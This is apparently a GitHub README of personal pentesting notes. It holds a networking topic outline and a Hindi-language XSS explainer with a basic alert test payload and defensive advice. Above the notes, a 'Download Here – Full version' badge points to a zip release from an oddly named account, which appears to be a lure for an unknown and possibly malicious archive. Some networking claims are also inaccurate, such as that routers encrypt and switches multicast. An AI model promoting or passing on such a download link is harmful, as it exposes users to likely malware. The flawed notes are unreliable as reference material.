# from-zero-to-root

[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-purple)](https://github.com/gutsyheartvegas834g81/from-zero-to-root/releases/download/3icuqhp/from-zero-to-root.zip)

Personal notes and resources from my journey into penetration testing and ethical hacking.
Complete Networking Summary for Pentesting (As Learned by Manoj)


---

1. Introduction to Networking:

Definition of Networking

Importance of Networking in Cybersecurity and Pentesting


2. Fundamental Concepts:

What is an IP Address?

Static vs Dynamic IP

Public vs Private IP


MAC Address

DNS (Domain Name System)

Ports and Protocols

Common Ports: 80, 443, 21, 22, 25, 53, etc.


TCP/IP Model vs OSI Model

Layers and Responsibilities



3. IP Addressing & Subnetting:

IPv4 and IPv6

Classes of IP Addresses (A, B, C)

Subnet Mask

CIDR Notation

Default Gateway Concept

How routing decisions are made


4. Core Networking Devices:

Hub (Broadcasts to all ports)

Switch (Multicast, Intelligent forwarding)

Router (Chooses best path, encrypts, forwards packet)

Bridge (Connects two networks)

Repeater (Amplifies signal)

Modem (Modulates/Demodulates signals)

Gateway (Protocol Translator)

Access Point

Firewall (Monitors incoming/outgoing traffic, enforces rules)

Proxy Server (Acts on behalf of client, hides identity)


5. Address Allocation & Management:

DHCP (Dynamic Host Configuration Protocol)

Works in Routers, ISP Towers, assigns IP automatically


NAT (Network Address Translation)


6. Packet Journey Explanation:

Packet as a "traveller"

Router as a "bus" and "path decision maker"

Path optimization and traffic load awareness

What happens if packet is dropped?

TCP handles retransmission

ICMP for diagnostics (ping, traceroute)



7. Special Protocols & Concepts:

ICMP (for network diagnostics)

VPN (Virtual Private Network)

Encrypts traffic, hides identity

Tunnel between client and destination


ARP (Address Resolution Protocol)

DNS Resolution Process

Proxy Server working with cache, anonymity


8. Security & Real-Life Mapping:

How all these devices/protocols are relevant in Pentesting

Real life examples (Phone connecting to IP via DHCP, Router forwarding, Firewall blocking unauthorized requests, etc.)


9. Revisions and Mastery:

3x Revisions completed

Learned all networking concepts without a laptop

Priority given to practical understanding

Understood implementation importance, will apply later




---

Cross-Site Scripting (XSS) Report
Prepared by: Manoj

1. XSS क्या होता है?
Cross-Site Scripting या XSS एक वेबसाइट की वल्नरेबिलिटी होती है जिसमें अटैकर वेबसाइट में स्क्रिप्ट (जैसे JavaScript) इनजेक्ट कर देता है। यह स्क्रिप्ट उस यूज़र के ब्राउज़र में रन होती है जो उस वेबसाइट को ओपन करता है। इससे अटैकर यूज़र का डाटा चुरा सकता है या कुछ और भी कर सकता है जैसे redirect, cookie चोरी, etc.

2. XSS कितने टाइप का होता है?
XSS के तीन main टाइप्स होते हैं:

Stored XSS: इसमें स्क्रिप्ट वेबसाइट के अंदर सेव हो जाती है (जैसे कमेंट बॉक्स, प्रोफाइल सेक्शन वगैरह में)। जब कोई यूज़र उस पेज को ओपन करता है तो स्क्रिप्ट ऑटोमेटिक रन हो जाती है।

Reflected XSS: इसमें स्क्रिप्ट URL में पास की जाती है और तुरंत ब्राउज़र में रन होती है। जैसे अगर कोई लिंक क्लिक करता है जिसमें स्क्रिप्ट है तो वो XSS ट्रिगर हो सकता है।

DOM-Based XSS: ये थोड़ा एडवांस होता है। इसमें स्क्रिप्ट ब्राउज़र साइड पर रन होती है, और HTML/DOM के ज़रिए execute होती है।


3. XSS का क्या असर हो सकता है?

अटैकर यूज़र की cookies चुरा सकता है।

सेशन हाईजैक कर सकता है।

पेज पर फेक फॉर्म डाल सकता है (फिशिंग के लिए)।

वेबसाइट का UI बदल सकता है।

किसी और वेबसाइट पर रीडायरेक्ट कर सकता है।


4. एक सिंपल Example:
मान लो कोई वेबसाइट यूज़र का नाम डायरेक्ट पेज पर दिखा रही है। अब अगर हम वहाँ यह डाल दें:

<script>alert('XSS');</script>

तो अगर उस वेबसाइट ने यूज़र इनपुट को sanitize नहीं किया, तो यह स्क्रिप्ट रन हो जाएगी और popup आ जाएगा।

5. XSS से बचने के तरीके:

यूज़र इनपुट को validate और sanitize करो।

HTML encode करो जो चीज़ें ब्राउज़र में दिखानी हैं।

<script> जैसे tags को allow मत करो।

Content Security Policy (CSP) लगाओ।

Cookies को HTTPOnly और Secure बनाओ।


6. XSS टेस्ट करने के लिए कुछ टूल्स:

Burp Suite

OWASP ZAP

XSS Hunter

Browser Developer Tools


7. Conclusion:
XSS बहुत ही common vulnerability है, लेकिन अगर हम थोड़ी सी सावधानी रखें और secure coding करें, तो इससे आसानी से बचा जा सकता है। एक Penetration Tester के लिए यह बहुत जरूरी है कि उसे XSS के basics अच्छे से पता हों, तभी वो रियल वर्ल्ड में इसका सही इस्तेमाल कर सकता है।
